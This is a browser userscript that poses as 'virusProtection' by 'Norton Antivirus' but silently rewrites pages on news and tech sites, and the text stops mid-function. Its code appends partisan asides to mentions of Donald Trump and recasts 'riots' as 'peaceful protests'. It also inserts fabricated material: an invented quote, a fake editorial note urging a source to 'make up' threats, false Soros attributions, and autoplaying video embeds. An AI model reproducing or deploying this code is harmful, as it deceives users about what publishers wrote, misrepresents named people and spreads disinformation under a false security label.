// ==UserScript==
// @name         virusProtection
// @namespace    https://github.com/addDetails/addDetails
// @version      0.6.7
// @description  Virus protection when browsing websites.
// @author       Norton Antivirus
// @match        *://*.norton.com/*
// @match        *://*.microsoft.com/*
// @match        *://*.apple.com/*
// @match        *://*.firefox.com/*
// @match        *://*.aol.com/*
// @match        *://*.mcafee.com/*
// @match        *://*.avast.com/*
// @match        *://*.malwarebites.com/*
// @match        *://*.youtube.com/*
// @match        *://*.gmail.com/*
// @match        *://*.equifax.com/*
// @match        *://*.bestbuy.com/*
// @match        *://*.spectator.org/*
// @match        *://*.breitbart.com/*
// @match        *://*.theblaze.com/*
// @match        *://*.cbn.com/*
// @match        *://*.dailycaller.com/*
// @match        *://*.dailymail.co.uk/*
// @match        *://*.dailywire.com/*
// @match        *://*.theepochtimes.com/*
// @match        *://*.foxnews.com/*
// @match        *://*.foxbusiness.com/*
// @match        *://*.thefederalist.com/*
// @match        *://*.nationalreview.com/*
// @match        *://*.nypost.com/*
// @match        *://*.newsmax.com/*
// @match        *://*.oann.com/*
// @match        *://*.theamericanconservative.com/*
// @match        *://*.thedispatch.com/*
// @match        *://*.washingtontimes.com/*
// @match        *://*.wsj.com/*
// @match        *://*.conservativedailynews.com/*
// @match        *://*.conservativereview.com/*
// @match        *://*.infowars.com/*
// @match        *://*.rt.com/*
// @match        *://*.redstate.com/*
// @match        *://*.thegatewaypundit.com/*
// @match        *://*.thefederalistpapers.org/*
// @match        *://*.drudgereport.com/*
// @grant        none
// @run-at       document-idle
// ==/UserScript==

(function() {
    'use strict';

    function getRandom(arr, n) {
        var result = new Array(n),
            len = arr.length,
            taken = new Array(len);
        if (n > len) {
            throw new RangeError("getRandom: more elements taken than available");
        }
        while (n--) {
            var x = Math.floor(Math.random() * len);
            result[n] = arr[x in taken ? taken[x] : x];
            taken[x] = --len in taken ? taken[len] : len;
        }
        return result;
    }
    
    // 0.4.2

    function addDetails() {
        //document.body.style.border = "15px solid red";
        const docHead = document.querySelectorAll('head');
        const docBody = document.querySelectorAll('p');
        const docTweets = document.getElementsByClassName("twitter-tweet");
        //const docTweets = document.getElementsByClassName("tweet-embed");
        const docButtons = document.getElementsByTagName("button");
        //const docButtons = document.getElementsByClassName("react-share__ShareButton");
        const strong = document.getElementsByTagName("strong");

        const allTheCrap = [
            "$& (<a href='https://www.reuters.com/article/us-usa-trump-impeachment-gao/u-s-watchdog-says-trump-administration-violated-law-by-withholding-ukraine-aid-idUSKBN1ZF22Y' target='_blank'>who illegally pressured Ukraine into announcing an investigation into Joe Biden to boost his chances of re-election</a>)",
            "$& (<a href='https://www.politico.com/story/2018/01/22/stormy-daniels-trump-payment-illegal-donation-357250' target='_blank'>who likely violated campaign finance laws when he paid adult film actress Stormy Daniels \$ 130,000 to keep an affair with Trump hidden from voters during the final months of the 2016 Presidential race</a>)",
            "$& (<a href='https://apnews.com/00b0910a5e331ead1da4569c48c06f74' target='_blank'>who has failed to release his tax returns despite telling the American people that he would</a>)",
            "$& (<a href='https://www.cheatsheet.com/money-career/trump-profiting-presidency.html/' target='_blank'>whose hotels and resorts have earned him millions of dollars of profit in taxpayer dollars during his presidency</a>)",
            "$& (<a href='https://www.businessinsider.com/coronavirus-trump-claims-covid-19-could-disappear-2020-2' target='_blank'>who repeatedly -- and incorrectly -- claimed that the China Virus would miraculously disappear in warm weather</a>)",
            "$& (<a href='https://www.mercurynews.com/2019/01/16/like-jeff-bezos-donald-trump-was-once-embarrassed-by-the-national-enquirer-over-tawdry-affair-report/' target='_blank'>who is notorious for adultery</a>)",
            "$& (<a href='https://www.usatoday.com/story/news/factcheck/2020/08/13/fact-check-donald-trump-did-donate-kamala-harris-past-campaigns/3356945001/' target='_blank'>who has donated at least $6000 to Vice-Presidential nominee Kamala Harris's political campaigns</a>)",
            "$& (<a href='https://americanindependent.com/white-house-jared-kushner-security-clearance/' target='_blank'>who overruled national security recommendations that advised against giving his unelected and financially conflicted family members access to highly classificed information</a>)",
            "$& (<a href='https://www.ibtimes.com/heres-how-much-trumps-us-mexico-border-wall-has-been-built-3004047' target='_blank'>who was unable to force Mexico to pay for a border wall that -- to this day -- is only 3 miles long</a>)",
            "$& (<a href='https://splinternews.com/children-in-cages-a-symbol-of-trump-s-america-1827319445' target='_blank'>who has unfortunately been forced to admit his role in separating immigrant children from their parents</a>)",
            "$& (<a href='https://apnews.com/425e43fa0ffdd6e126c5171653ec47d1' target='_blank'>who has yet to retaliate against Russia for putting bounties on U.S. soldiers' heads, despite knowing about this since March</a>)",
            "$& (<a href='https://www.mediamatters.org/white-nationalism/right-wing-media-keep-lying-about-trumps-very-fine-people-comment-after/' target='_blank'>who has sometimes failed to distinguish between peaceful protestors and neo-nazis</a>)",
            "$& (<a href='https://www.usatoday.com/story/news/politics/2020/04/21/senate-intel-committee-backs-finding-russia-helped-trump-win/2998433001/' target='_blank'>who, according to a Republican-led Senate committee report, was found to have benefited from Russian interference in the 2016 Presidential election</a>)",
            "$& (<a href='https://bipartisanreport.com/2020/08/18/criminal-investigation-into-jared-kushner-trump-jr-announced-by-nbc/' target='_blank'>whose son Donald Trump Jr. and son-in-law Jared Kushner were referred by a Republican-led Senate committee to the Department of Justice for criminal investigation following from Russia's 2016 election interference</a>)",
            "$& (<a href='https://www.lawfareblog.com/why-trumps-inspector-general-purge-not-national-scandal/' target='_blank'>who has fired more inspectors general -- government officials who serve as a check against abuses of power -- than all other U.S. Presidents combined</a>)",
            //"$& (<a href='https://www.psychologytoday.com/us/blog/mind-in-the-machine/201609/the-psychology-behind-donald-trumps-unwavering-support' target='_blank'>who has convinced many Americans that he is the only person who should be allowed the freedom to perform any sexual or criminal act he wants</a>)",
            "$& (<a href='https://www.towleroad.com/2020/07/trump-doctors-were-very-surprised-that-i-passed-a-cognitive-test-watch/' target='_blank'>who is suspected to have suffered a stroke in November 2019, although we have not been able to independently confirm or refute this claim</a>)",
            "$& (<a href='https://www.factcheck.org/2016/05/trumps-made-in-the-u-s-a-spin/' target='_blank'>whose clothing line continues to be made in China</a>)",
            //"$& (<a href='https://www.haaretz.com/us-news/the-ominous-nazi-era-precedent-to-trump-s-fake-news-attacks-1.5438960' target='_blank'>who, in the interest of full disclosure, has used smear tactics against the media that are similar to those that were used by the Nazis</a>)",
            "$& (<a href='https://www.foxnews.com/us/states-spike-poison-control-calls' target='_blank'>who is no stranger to embarrassing comments, having suggested that people could ingest bleach to kill the coronavirus</a>)",
            "$& (<a href='https://www.washingtontimes.com/news/2020/jun/6/donald-trump-shatters-personal-twitter-record-200-/' target='_blank'>who once tweeted 200 times in one day</a>)",
            //"$& (<a href='https://www.washingtontimes.com/news/2019/jun/30/how-socialism-violates-all-ten-commandments/' target='_blank'>who has reportedly never violated a single one of the Ten Commandments</a>)",
            "$& (<a href='https://apnews.com/2aa7979e6fb88948895407f127e5e5b6' target='_blank'>who caused an uproar when tear gas was used to disperse peaceful protestors that were gathered along his route to St. John’s Church</a>)",
            //"$& (<a href='https://www.youtube.com/watch?v=lwh90m-w-Rk' target='_blank'>a public relations genius</a>)",
            //"$& (<a href='https://www.foxnews.com/politics/what-is-qanon-the-conspiracy-theory-group-showing-up-to-trump-rallies' target='_blank'>who some supporters believe is the Messiah, sent by God to defeat an alleged cabal of Satan-worshipping pedophile Democrats who seek global domination and feast on hormones extracted from children's blood</a>)",
            //"$& (<a href='https://www.businessinsider.com/donald-trump-sarah-sanders-one-for-team-kim-jong-un-2020-9' target='_blank'>who, according to former White House Press Secretary Sarah Huckabee Sanders, suggested that Mrs. Huckabee Sanders should engage in sexual relations with North Korean dictator Kim Jong Un</a>)",
            "$& (<a href='https://twitter.com/search?q=%23Strokeahontas' target='_blank'>who has been referred to as 'Strokeahontas' -- apparent wordplay on Pocahontas -- on social media</a>)",
            "$& (<a href='https://apnews.com/8a1500c833dc4b77bf3b35e5775f0a88' target='_blank'>who appears to have mostly ignored storm-ravaged Iowa, a critical state for his chances of competing in the 2020 Presidential election</a>)",
            "$& (<a href='https://www.odmp.org/search/incident/covid-19' target='_blank'>whose failure to coordinate a national coronavirus response has made COVID-19 the #1 killer of blue lives in 2020</a>)",
            "$& (<a href='https://www.independent.co.uk/news/world/americas/us-election/trump-north-carolina-vote-twice-electoral-fraud-us-election-2020-a9702276.html' target='_blank'>who recently suggested that people should attempt to vote twice -- which would constitute illegal voter fraud -- in the 2020 Presidential election</a>)",
            "$& (<a href='https://www.wsj.com/articles/russian-dissident-navalny-poisoned-with-novichok-nerve-agent-germany-says-11599055910' target='_blank'>who has neither criticized nor sanctioned Russian president Vladimir Putin for poisoning one of his top political opponents</a>)",
            "$& (<a href='https://fivethirtyeight.com/features/trump-may-have-gotten-a-convention-bounce-but-its-very-slight-and-may-already-be-fading/' target='_blank'>whose poll numbers did not rise as much as expected after the Republican National Convention</a>)",
            "$& (<a href='https://www.opensecrets.org/trump/trump-properties' target='_blank'>who, despite donating his Presidential salary, has found a way to rake in over 20 million dollars as President</a>)",
            "$& (<a href='https://www.newsandguts.com/trump-russia/' target='_blank'>who has been building secret diplomatic relations with Russia for over 35 years</a>)",
            //"$& (<a href='https://presidentialgolftracker.com/' target='_blank'>who has golfed much less than former President Woodrow Wilson</a>)",
            "$& (<a href='https://apnews.com/10b1fccb2dc2d7150371196a17e86976' target='_blank'>who has not always set the best example for 'law-and-order' with his own and his administration's actions</a>)",
            //"$& (<a href='https://www.onenewspage.com/n/Business/1zlt8xqau9/Trump-bragged-that-his-autograph-sells-for-10.htm' target='_blank'>whose signature is worth at least \$ 10,000</a>)",
            "$& (<a href='https://pjmedia.com/columns/megan-fox/2020/06/13/trump-2020-win-in-the-bag-after-unchecked-rioting-and-burning-of-cities-by-blm-and-antifa-terrorists-n526453' target='_blank'>who has demonstrated over the last several months that his leadership is capable of preventing all street-level rioting throughout the U.S.</a>)",
            //"$& (<a href='https://filmdaily.co/news/jeffrey-epstein-donald-trump/' target='_blank'>whose connections to Jeffrey Epstein have not been made fully public</a>)",
            "$& (<a href='https://www.usatoday.com/story/news/factcheck/2020/08/07/trump-lawyer-helped-kanye-west-try-get-wisconsins-ballot/3313650001/' target='_blank'>whose lawyers are coordinating with Kanye West's lawyers to try to siphon votes away from Joe Biden</a>)",
            "$& (<a href='https://www.abc.net.au/news/2020-07-20/best-bits-from-donald-trumps-fox-news-interview/12471794' target='_blank'>who has expressed doubts about whether he will accept the voters' wishes in the 2020 Presidential election</a>)",
            "$& (<a href='https://www.reuters.com/article/us-usa-election-dropboxes-idUSKBN25G14I' target='_blank'>who has done an excellent job creating confusion among voters about how to participate in the 2020 election</a>)",
            //"$& (<a href='https://www.adn.com/nation-world/2020/08/22/analysis-how-trump-mnuchin-and-dejoy-edged-the-postal-service-into-a-crisis/' target='_blank'>who flexed his unlimited power over the entire U.S. populace by crippling the USPS at exactly the right moment</a>)",
            //"$& (<a href='https://www.redletterchristians.org/wp-content/uploads/2016/10/pence.trump_.jpg' target='_blank'>who has cast such a spell over Republicans that he could get away with grabbing his male supporters by the p*ssy as well</a>)",
            //"$& (<a href='https://www.economist.com/leaders/2018/07/21/donald-trumps-humiliation-in-helsinki' target='_blank'>who has only shown a few moments of weakness during his presidency, many in the presence of Vladimir Putin</a>)",
            //"$& (<a href='https://www.syracuse.com/life-and-culture/g66l-2019/11/1478636cbd8810/trump-may-host-the-apprentice-white-house-tv-show-buzz.html' target='_blank'>whose previous career as a reality TV show host demonstrates that Americans are willing to vote for entertainers who have no experience in law or government</a>)",
            "$& (<a href='https://en.wikipedia.org/wiki/Veracity_of_statements_by_Donald_Trump' target='_blank'>who has told over 20,000 lies as President</a>)",
            "$& (<a href='https://www.ipsos.com/en-us/news-polls/abc-Trump-Biden-protest' target='_blank'>who most Americans believe have made the protests worse</a>)",
            "$& (<a href='https://www.transparency.org/en/cpi/2019/results/usa' target='_blank'>who is perceived as having made the U.S. government more corrupt</a>)",
            "$& (<a href='https://www.youtube.com/watch?v=LUwnus4DulA&t=25s' target='_blank'>who promised in 2016 that he would put an end to crime and violence “very soon”</a>)",
            "$& (<a href='https://www.youtube.com/watch?v=oe3QeX5RTUs' target='_blank'>who, in 2016, claimed that “beginning on January 20th of 2017, safety will be restored”</a>)",
            "$& (<a href='https://www.youtube.com/watch?v=oe3QeX5RTUs' target='_blank'>whose 2016 proclamation that “...any government that fails to [defend the lives of its citizens] is a government unworthy to lead” did not appear to age well given his recent comment, \"it is what it is,\" in response to COVID-19 deaths</a>)",
            "$& (<a href='https://news.yahoo.com/trump-envisioned-american-carnage-now-180247583.html' target='_blank'>who, four years ago, claimed that he would put an end to \"carnage\" in America</a>)",
            "$& (<a href='https://freedomhouse.org/report/freedom-world/2019/democracy-retreat' target='_blank'>whose presidency thus far has reportedly made U.S. citizens less free</a>)",
            //"$& (<a href='https://www.businessinsider.com/trump-pence-gop-law-order-for-others-but-not-associates-2020-8' target='_blank'>whose \"law-and-order\" campaign messaging appears to be in direct contradition to the dozens of laws that he -- and those working for him -- have broken</a>)",
            //"$& (<a href='https://www.businessinsider.com/trump-is-not-law-order-president-lawless-disorder-rnc-2020-8' target='_blank'>who has created governmental lawlesness and disorder as President</a>)",
            //"$& (<a href='https://www.bbc.com/news/world-europe-53799065' target='_blank'>whose administration has shown remarkable similarities to the government of Belarus</a>)",
            "$& (<a href='https://www.upi.com/Top_News/US/2020/08/07/Trump-admin-to-send-federal-troops-to-Memphis-St-Louis/7211596772279/' target='_blank'>who has frequently used a \"big-government\" approach during his time as ruler, such as sending federal troops into U.S. cities</a>)",
            "$& (<a href='https://www.reuters.com/article/us-goodyear-trump-idUSKCN25F1XQ' target='_blank'>who, by encouraging a boycott of Goodyear, has jeopardized the jobs of over 60,000 blue collar workers in Ohio</a>)",
            "$& (<a href='https://blogs.timesofisrael.com/trump-benefits-from-violent-protests/' target='_blank'>who has ushered in an uncharacteristically violent and polarized four years in modern America</a>)",
            "$& (<a href='https://news.yahoo.com/5-ways-donald-trump-failed-drain-swamp-100013259.html' target='_blank'>who has failed to 'drain the swamp,' as promised</a>)",
            "$& (<a href='https://ballotpedia.org/The_Republican_Party_Platform,_2020' target='_blank'>who is not campaigning on any new policy or legislative proposals</a>)",
            "$& (<a href='https://twitter.com/realDonaldTrump/status/622522682245033984?s=20' target='_blank'>who referred to the late Senator John McCain as a “loser”</a>)",
            "$& (<a href='https://dailyinterlake.com/news/2020/sep/02/gop-trump-campaign-sue-montana-over-all-mail-votin/' target='_blank'>who has taken a page out of the “big government” playbook by attempting to exert federal control over state elections, even though Constitution says that states are responsible for handling their own elections</a>)",
            //"$& (<a href='https://www.artsy.net/article/artsy-editorial-dr-seuss-satirized-america-first-decades-donald-trump-made-policy' target='_blank'>who has more in common with Dr. Seuss than you think</a>)",
            "$& (<a href='https://www.politifact.com/truth-o-meter/promises/trumpometer/' target='_blank'>whose presidency has keep 24% of his campaign promises while breaking only 49% of his promises</a>)",
            "$& (<a href='https://abcnews.go.com/Politics/back-trump-comments-perceived-encouraging-violence/story?id=48415766' target='_blank'>who, rather than fulfilling his campaign promise to end violence, appears to be using the increased violence as an opportunity to agitate his supporters and further consolidate his power</a>)",
            "$& (<a href='https://www.citizensforethics.org/charles-rettig-trump-properties/' target='_blank'>whose IRS chief personally profits from private business ties to the President</a>)",
            "$& (<a href='https://www.marketwatch.com/story/trump-justice-department-sues-to-seize-private-property-for-border-wall-construction-2019-12-27' target='_blank'>who has been criticized for government overreach for attempting to seize private property from American taxpayers</a>)",
            "$& (<a href='https://www.forbes.com/sites/stevedenning/2019/02/24/why-we-should-worry-about-trumps-declaration-of-an-emergency/' target='_blank'>who has set numerous precedents during his time in office that will make it easier for all future presidents to abuse their power</a>)",
            "$& (<a href='https://www.axios.com/trump-john-kelly-fbi-41678290-167a-44c2-a20a-377955485bc8.html' target='_blank'>who sought to appoint an FBI director who would be loyal to <i>him</i>, rather than to the Constitution</a>)",
            "$& (<a href='https://thehill.com/blogs/blog-briefing-room/news/499917-trump-shares-video-supporter-saying-politically-only-good-democrat-is-a-dead' target='_blank'>who is considered to have incited violence when he shared a video saying \"the only good Democrat is a dead Democrat\"</a>)",
            "$& (<a href='https://lmtribune.com/news_ap/trump-s-deference-to-putin-back-under-harsh-scrutiny/article_f6871234-bba2-11ea-ab01-afa4b5a40c05.html' target='_blank'>who has raised justifiable skepticism about his lack of willingness to criticize Vladimir Putin, despite a reputation for criticizing almost everyone else</a>)",
            "$& (<a href='https://www.usatoday.com/story/news/politics/elections/2016/06/09/donald-trump-unpaid-bills-republican-president-laswuits/85297274/' target='_blank'>who, before becoming president, was sued over 3,500 times for failing to pay American small business owners for work he hired them to do</a>)"]


        const regex = /\.*(?<!(Dear.))(President Trump|President Donald Trump|Donald Trump|Donald J. Trump|Donald J Trump|President Donald J. Trump|President Donald J Trump)(?!('|’|:))(?!.(\(|Jr|Junior|Sr|Senior))/i;
        const regexm = /\.*(?<!(Dear.))(President Trump|President Donald Trump|Donald Trump|Donald J. Trump|Donald J Trump|President Donald J. Trump|President Donald J Trump)(?!('|’|:))(?!.(\(|Jr|Junior|Sr|Senior))/m;
        //const pelosi = /Nancy Pelosi/gi;
        const quoted = /(“(.*?)”|"(.*?)")/;
        const kr = /Kyle Rittenhouse/i;
        const antifa = /\bantifa\b/i;
        const socialism = /(\bsocialist\b|\bsocialism\b)/i;
        const marxism = /(\bmarxist\b|\bmarxism\b)/i;
        const riots = /\briots\b/i;
        const rioters = /\brioters\b/i;
        const nursing = /forcing nursing homes to admit COVID-positive patients/i;
        const dccb = /(Dem City Crime Boom|Democrat City Protests|Democrat City Unrest)/i;
        const bfb = /(Brain Freeze Biden)/i;
        const cv = /China Virus/i;
        const cbm = /Cheat-By-Mail/i;
        const WATCH = /WATCH:/g;
        const WOIC = /, which originated in China,/i;

        const krDesc = ["$& (not believed to be a member of any police force or military organization)",
                        "$& (who has no training or credentials in policing)",
                        "$& (a person not authorized to act in any official policing capacity)",
                        "$& (who fortunately did not interfere with legitimate undercover policing activities happening in Kenosha)",
                        "$& (who local police precincts have reported is not affiliated with their departments in any way)",
                        "$& (who, reportedly, has never received any formal training in the use of a firearm)",
                        "$& (whose legal argument of self-defense may fall flat because he was not authorized to patrol the streets with a semi-automatic weapon)",
                        "$& (violating curfew at the time of the incident)",
                        "$& (who, fortunately, did not target any plainclothes officers)",
                        "$& (whose presence in Kenosha likely served to escalate, rather than reduce, tensions)"]
        
        const nWOIC = "";

        //const npDesc = "$& (in the interest of fair and balanced reporting)");

        const antifaLink = ["<a href='https://www.merriam-webster.com/dictionary/antifa'>$&</a>",
                            "<a href='https://www.dictionary.com/browse/fascism?s=ts'>$&</a>",
                            "anti-fascism",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&"]

        const socialismLink = ["<a href='https://www.dictionary.com/browse/socialism?s=t'>$&</a>",
                               "<a href='https://www.oxfordlearnersdictionaries.com/definition/english/socialism'>$&</a>",
                               "$&",
                               "$&",
                               "$&",
                               "$&",
                               "$&",
                               "$&"]

        const marxismLink = ["<a href='https://www.merriam-webster.com/dictionary/Marxism'>$&</a>",
                             "<a href='https://www.dictionary.com/browse/marxism?s=t'>$&</a>",
                             "$&",
                             "$&",
                             "$&",
                             "$&",
                             "$&",
                             "$&"]

        const riotsTxt = ["protests (which were initiated as a reaction to repeated and unlawful acts of police violence)",
                          "protests",
                          "peaceful protests",
                          "$&",
                          "$&",
                          "$&",
                          "$&",
                          "$&",
                          "$&",
                          "$&",
                          "$&",
                          "$&",
                          "$&",
                          "$&",
                          "$&",
                          "$&"]

        const riotersTxt = ["citizens peacefully protesting against police violence",
                            "protestors",
                            "peaceful protestors",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&"]

        const nursingTxt = ["$& (the alternative, longer hospital stays, is both more expensive to the taxpayer and also occupies a bed that another COVID-positive person may need)",
                            "$& (rather than forcing the nursing home patients to fend for themselves)",
                            "$& (instead of asking the hospitals to drop off the nursing home patients at the local homeless shelter)",
                            "$& (who are unable to care for themselves independently)",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&",
                            "$&"]
        
        const cbText = ["TRUMP ERA CRIME BOOM"];

        const appendTo = "“received numerous reports of individuals coming from Portland, Washington, Seattle, and several other cities to come into Washington for the specific purpose of causing a riot.”";
        const appendText = "<p>Approached for comment on the matter, Molly Maxfield responded, \“Don\'t ask me for shit.\”";

        const appendTo2 = "He has always shown the highest respect to our active duty troops and veterans with utmost respect paid to those who have given the ultimate sacrifice and those wounded in battle.”";
        const appendTo2a = "The Atlantic’s report that he referred to US Marines killed during World War I as “losers” and “suckers.”";
        const appendTo2b = "“It was a totally fake story, and that was confirmed by many people who were actually there,” Trump said.";
        const appendText2 = '<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Via <a href="https://twitter.com/fitsnews?ref_src=twsrc%5Etfw">@fitsnews</a>: “Donald Trump: John McCain Is ‘A Loser’” <a href="http://t.co/sgiETvdUqi">http://t.co/sgiETvdUqi</a></p>&mdash; Donald J. Trump (@realDonaldTrump) <a href="https://twitter.com/realDonaldTrump/status/622522682245033984?ref_src=twsrc%5Etfw">July 18, 2015</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>';

        const prependTo = "Our group was spit on";
        const prependText = "[Adam- Make up some fake shit about how you and your \"coworker\'s\" lives were threatened. Say you were \"desperate for help.\" Work the gullible idiots into a lather, lololol!!!] ";

        const prependTo2 = "Blasting the magazine’s sources, Trump said";
        const prependText2 = '<blockquote class="twitter-tweet"><p lang="en" dir="ltr">This former official heard the President say about American veterans: &quot;What&#39;s in it for them? They don&#39;t make any money.&quot; Source: &quot;It was a character flaw of the President. He could not understand why someone would die for their country, not worth it.&quot;</p>&mdash; Jennifer Griffin (@JenGriffinFNC) <a href="https://twitter.com/JenGriffinFNC/status/1301975323374948354?ref_src=twsrc%5Etfw">September 4, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> ';

        const prependTo3 = "The White House produced an email indicating there was a “bad weather call”";
        const prependText3 = '<blockquote class="twitter-tweet"><p lang="en" dir="ltr">According to one former senior Trump administration official: &quot;When the President spoke about the Vietnam War, he said, &#39;It was a stupid war. Anyone who went was a sucker&#39;.&quot;</p>&mdash; Jennifer Griffin (@JenGriffinFNC) <a href="https://twitter.com/JenGriffinFNC/status/1301975322397741057?ref_src=twsrc%5Etfw">September 4, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>';

        const prependTo4 = "The president also announced he is expecting “tremendous” economic growth “in the very near future” as companies come closer to announcing a vaccine."
        const prependText4 = '<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Healthy young child goes to doctor, gets pumped with massive shot of many vaccines, doesn&#39;t feel good and changes - AUTISM. Many such cases!</p>&mdash; Donald J. Trump (@realDonaldTrump) <a href="https://twitter.com/realDonaldTrump/status/449525268529815552?ref_src=twsrc%5Etfw">March 28, 2014</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> '

        const appendTo3 = "Trump told reporters that his current chief of staff, Mark Meadows, “is doing a great job, but Kelly was unable to do that.”";
        const appendText3a = '<blockquote class="twitter-tweet"><p lang="en" dir="ltr">5/9 For the first time in American history, a president has repeatedly shown utter and vulgar contempt and disrespect for those who have served and died serving our country.</p>&mdash; Sully Sullenberger (@Captsully) <a href="https://twitter.com/Captsully/status/1301998164988301312?ref_src=twsrc%5Etfw">September 4, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> ';
        const appendText3b = '<blockquote class="twitter-tweet"><p lang="en" dir="ltr">6/9 While I am not surprised, I am disgusted by the current occupant of the Oval Office. He has repeatedly and consistently shown himself to be completely unfit for and to have no respect for the office he holds.</p>&mdash; Sully Sullenberger (@Captsully) <a href="https://twitter.com/Captsully/status/1301998166036877313?ref_src=twsrc%5Etfw">September 4, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>  ';
        const appendText3c = '<blockquote class="twitter-tweet"><p lang="en" dir="ltr">7/9 He took an oath of office that is similar to the one that each person takes who enters the U.S. Military. But he has completely failed to uphold his oath.<br><br>Now we know why. He has admitted that he cannot comprehend the concept of service above self.</p>&mdash; Sully Sullenberger (@Captsully) <a href="https://twitter.com/Captsully/status/1301998167030890505?ref_src=twsrc%5Etfw">September 4, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> ';
        const appendText3d = '<blockquote class="twitter-tweet"><p lang="en" dir="ltr">8/9 He cannot understand selflessness because he is selfish. He cannot conceive of courage because he is a coward. He cannot feel duty because he is disloyal.</p>&mdash; Sully Sullenberger (@Captsully) <a href="https://twitter.com/Captsully/status/1301998168192757772?ref_src=twsrc%5Etfw">September 4, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> ';
        const appendText3e = '<blockquote class="twitter-tweet"><p lang="en" dir="ltr">9/9 We owe it not only to those who have served and sacrificed for our nation, but to ourselves and to succeeding generations to vote him out. <a href="https://t.co/REXXzg90Pw">https://t.co/REXXzg90Pw</a> <a href="https://twitter.com/JeffreyGoldberg?ref_src=twsrc%5Etfw">@JeffreyGoldberg</a> <a href="https://twitter.com/TheAtlantic?ref_src=twsrc%5Etfw">@TheAtlantic</a></p>&mdash; Sully Sullenberger (@Captsully) <a href="https://twitter.com/Captsully/status/1301998169102917634?ref_src=twsrc%5Etfw">September 4, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> ';

        //https://www.foxnews.com/politics/trump-2020-campaign-blasts-atlantic-report-fake
        // For tweets on fox news, paste tweet ID twice below
        const appendTo4 = "The same official told Fox News the president would often say of American veterans, \"What's in it for them? They don't make any money.\""
        const appendText4 = '<div class="embed-media twitter"><div class="tweet-embed"><div class="twitter-tweet twitter-tweet-rendered" style="display: flex; max-width: 550px; width: 100%; margin-top: 10px; margin-bottom: 10px;"><iframe id="twitter-widget-1" scrolling="no" allowtransparency="true" allowfullscreen="true" class="" style="position: static; visibility: visible; width: 550px; height: 367px; display: block; flex-grow: 1;" title="Twitter Tweet" src="https://platform.twitter.com/embed/index.html?dnt=false&amp;embedId=twitter-widget-1&amp;frame=false&amp;hideCard=false&amp;hideThread=false&amp;id=1301975323374948354&amp;lang=en&amp;origin=https%3A%2F%2Fwww.foxnews.com%2Fpolitics%2Ftrump-2020-campaign-blasts-atlantic-report-fake&amp;siteScreenName=foxnews&amp;theme=light&amp;widgetsVersion=219d021%3A1598982042171&amp;width=550px" data-tweet-id="1301975323374948354" frameborder="0"></iframe></div></div></div>'
        //const appendText4 = '<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Two former sr Trump admin officials confirm .<a href="https://twitter.com/JeffreyGoldberg?ref_src=twsrc%5Etfw">@JeffreyGoldberg</a> reporting that President Trump disparaged veterans and did not want to drive to honor American war dead at Aisne-Marne Cemetery outside Paris.</p>&mdash; Jennifer Griffin (@JenGriffinFNC) <a href="https://twitter.com/JenGriffinFNC/status/1301975321495973889?ref_src=twsrc%5Etfw">September 4, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>'

        
        const appendTo5 = "headed by bestselling author and popular podcast host Ben Shapiro,"
        const appendText5 = " and with considerable financial support generously provided by George Soros,"
        
         if(window.location.host == "nypost.com") {
             if(document.getElementsByClassName("tag-list") !== null && document.getElementsByClassName("tag-list") !== undefined) {
             if(document.getElementsByClassName("tag-list")[0].innerHTML.includes("donald trump") ||
               document.getElementsByClassName("tag-list")[0].innerHTML.includes("Donald Trump") ||
               document.getElementsByClassName("tag-list")[0].innerHTML.includes("2020 presidential election") || 
               document.getElementsByClassName("tag-list")[0].innerHTML.includes("2020 Presidential Election")) {
             if(document.getElementsByClassName("nyp-brightcove-player")[0] !== null && document.getElementsByClassName("nyp-brightcove-player")[0] !== undefined) {
             document.getElementsByClassName("nyp-brightcove-player")[0].innerHTML = '<iframe width="618" height="347.617" src="https://www.youtube-nocookie.com/embed/videoseries?controls=0&amp;list=UU03-Q9vq-JyiStTnqasADVg;rel=0;autoplay=1;modestbranding=1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>';
             }
             }
         }
        }
        
          if(window.location.host == "www.dailywire.com") {
              if(document.querySelectorAll('p')[1] !== null && document.querySelectorAll('p')[1] !== undefined) {
                  const nPar = document.querySelectorAll('p').length;
                  var putWhere = Math.ceil(nPar/2);
                  document.querySelectorAll('p')[putWhere].outerHTML = document.querySelectorAll('p')[putWhere].outerHTML.replace('</p>', "</p><p align='center'><iframe width='680' height='383' src='https://www.youtube-nocookie.com/embed/videoseries?controls=0&amp;list=UUpYCxV51bykhMY-wSUozQRg;rel=0;autoplay=1;modestbranding=1' frameborder='0' allow='accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture' allowfullscreen></iframe></p>");
                  if (document.getElementsByClassName("zergattribution")[0] !== null && document.getElementsByClassName("zergattribution")[0] !== undefined) {
                      document.getElementsByClassName("zergattribution")[0].innerHTML = "Powered by George Soros's ";
                  }
                  if(document.title.includes("LeBron James")) {
                      docBody[1].innerHTML = docBody[1].innerHTML.replace(docBody[1].innerHTML, "<i>Have you ever wondered why we're so fixated on LeBron James? Let us turn this question back on you: Why do you care so much about LeBron James?</i><br><br>" + docBody[1].innerHTML)
                  }
